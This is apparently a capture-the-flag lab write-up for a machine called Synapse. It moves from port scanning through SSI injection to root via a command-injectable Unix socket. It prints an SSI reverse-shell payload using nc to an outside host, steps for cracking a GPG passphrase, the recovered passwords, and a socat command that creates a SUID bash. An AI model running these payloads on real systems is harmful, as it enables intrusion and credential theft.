# Synapse

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.201.149
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 12:30 +08
Nmap scan report for 192.168.201.149
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### SMB + FTP Rabbit Holes

FTP doesn't accept anonymous logins, and SMB with no credentials doesn't show us any share that we can access:

```
$ smbmap -H 192.168.201.149
[+] IP: 192.168.201.149:445     Name: 192.168.201.149                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

It is thus likely that there's a web exploit, so we can start proxying traffic through Burpsuite.&#x20;

### Web Enum --> SSI Injection

Port 80 was running a custom dashboard:

<figure><img src="../../../.gitbook/assets/image (1537).png" alt=""><figcaption></figcaption></figure>

The File Manager was running elFinder, but we cannot access it since we need administrative access:

<figure><img src="../../../.gitbook/assets/image (2569).png" alt=""><figcaption></figcaption></figure>

I checked the user tab, and found that the user was called `mindsflee`:

<figure><img src="../../../.gitbook/assets/image (3079).png" alt=""><figcaption></figcaption></figure>

All of options were under construction, except for the one on the right most.&#x20;

<figure><img src="../../../.gitbook/assets/image (3617).png" alt=""><figcaption></figcaption></figure>

From my enumeration, this seems to be the most vulnerable point. I attempted to upload some PHP webshells, but it seems only images are allowed.

<figure><img src="../../../.gitbook/assets/image (3151).png" alt=""><figcaption></figcaption></figure>

There was one weird part, which was the `url=inspect.shtml` portion, since I had never seen that before. Searching for `shtml` gives us results for Server Side Includes (SSI).

<figure><img src="../../../.gitbook/assets/image (2070).png" alt=""><figcaption></figcaption></figure>

Hacktricks has done a page on SSI Injection that we could try.

{% embed url="https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection" %}

We can try some of the payloads:

<figure><img src="../../../.gitbook/assets/image (3613).png" alt=""><figcaption></figcaption></figure>

If we follow the redirect, we get this:

<figure><img src="../../../.gitbook/assets/image (3083).png" alt=""><figcaption></figcaption></figure>

We now have RCE on the machine, and we can easily get a reverse shell using this:

```
<!--#exec cmd='nc -c bash 192.168.45.189 21' -->
```

<figure><img src="../../../.gitbook/assets/image (3082).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### GPG Creds --> Mindsflee Shell

Within the `/home/mindsflee` directory, there are some files of interest:

```
www-data@synapse:/home/mindsflee$ ls -la
total 32
drwxr-xr-x 3 mindsflee mindsflee 4096 Jun 10  2021 .
drwxr-xr-x 3 root      root      4096 Jun 10  2021 ..
lrwxrwxrwx 1 root      root         9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mindsflee mindsflee  220 Jun 10  2021 .bash_logout
-rw-r--r-- 1 mindsflee mindsflee 3526 Jun 10  2021 .bashrc
drwxr-xr-x 2 root      root      4096 Jun 14  2021 .gnupg
-rw-r--r-- 1 mindsflee mindsflee  807 Jun 10  2021 .profile
-rw-r--r-- 1 mindsflee mindsflee   33 Jul 15 00:29 local.txt
-rw-r--r-- 1 root      root      2058 Jan  3  2021 synapse_commander.py

www-data@synapse:/home/mindsflee/.gnupg$ ls -la
total 20
drwxr-xr-x 2 root      root      4096 Jun 14  2021 .
drwxr-xr-x 3 mindsflee mindsflee 4096 Jun 10  2021 ..
-rw-r--r-- 1 mindsflee mindsflee 5180 Jun 14  2021 creds.priv
-rw-r--r-- 1 mindsflee mindsflee  124 Jun 14  2021 creds.txt.gpg
```

The `.gnupg` file contains some creds. Download these files back to our machine, and we can then try to decrypt it. Using `gpg`, we can attempt to import this key but it requires a passphrase.&#x20;

We can crack this using `gpg2john` and `john`:

```
$ gpg2john creds.priv > gpg_hash
$ john --show gpg_hash                                     
mindsflee:qwertyuiop:::mindsflee::creds.priv
```

Using this, we can then import the key using `gpg` and decrypt the file:

```
$ gpg --import creds.priv       
gpg: key 8ECE3C203E92BE79: "mindsflee" not changed
gpg: key 8ECE3C203E92BE79: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1

$ gpg --output decrypted --decrypt creds.txt.gpg
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase

$ cat decrypted                           
user: mindsflee
password: m1ndsfl33w1llc4tchy0u?
```

Using this password, we can `su` to `mindsflee`.

<figure><img src="../../../.gitbook/assets/image (3172).png" alt=""><figcaption></figcaption></figure>

### Sudo Privileges --> Socket Injection

The `mindsflee` user can use `sudo` with the Python script we found:

```
[sudo] password for mindsflee: 
Matching Defaults entries for mindsflee on synapse:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mindsflee may run the following commands on synapse:
    (root) /usr/bin/python /home/mindsflee/synapse_commander.py
```

Here's the content of the script:

```python
import socket
import os, os.path, sys
import time
from collections import deque    





print("""\
  
 _____ __ __ _____ _____ _____ _____ _____    _____ _____ _____ _____ _____ _____ ____  _____ _____ 
|   __|  |  |   | |  _  |  _  |   __|   __|  |     |     |     |     |  _  |   | |    \|   __| __  |
|__   |_   _| | | |     |   __|__   |   __|  |   --|  |  | | | | | | |     | | | |  |  |   __|    -|
|_____| |_| |_|___|__|__|__|  |_____|_____|  |_____|_____|_|_|_|_|_|_|__|__|_|___|____/|_____|__|__|


 
  """)

print("Focus your approach with a system designed for single network port access.")
print ("With Synapse Commander, a single arm delivers three multi-jointed instruments")
print("and a fully wristed 3DHD camera for visibility and control in narrow surgical spaces.")
print("Streamlined setup, multiple control modes and a dynamic statistics display are included")
print
print("1 - Access to ARM management")
print("2 - Enable 3DHD camera")
print("3 - Settings")
print("4 - Reboot the system")
print
instruction = raw_input("Synapse Instruction:")

if instruction == "1":
    
    print ("\nARM MANAGEMENT ENABLED")
    os.system("touch 2343432445467676")
elif instruction == "2":
    
    print ("\n3DHD CAMERA ENABLED")
    os.system("touch 5344225453244546")
elif instruction == "3":
    
    print ("\nACCESS TO SETTINGS CONFIGURATION")
    os.system("touch 77756563456244546")
elif instruction == "4":
    
    print ("\nSYSTEM REBOOTED")
    os.execl(sys.executable, sys.executable, *sys.argv)

else:
    os.execl(sys.executable, sys.executable, *sys.argv)



if os.path.exists("/tmp/synapse_commander.s"):
  os.remove("/tmp/synapse_commander.s")    

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/synapse_commander.s")
os.system("chmod o+w /tmp/synapse_commander.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

This program seems to open a Socket as `root` using the configuration of `synapse_commander.s` after we input any number from 1-3, since option 4 and all others would just re-run the script.&#x20;

Again, Hacktricks has a page for this:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/socket-command-injection" %}

In one SSH session, run the Python script and input '1'. In another SSH session, run this command:

{% code overflow="wrap" %}
```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s
```
{% endcode %}

When we enter that command, the script starts waiting for data to be sent in, which it passes to `os.system(datagram)`. This would result in RCE as `root`:

<figure><img src="../../../.gitbook/assets/image (3112).png" alt=""><figcaption></figcaption></figure>

We can then easily get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3635).png" alt=""><figcaption></figcaption></figure>
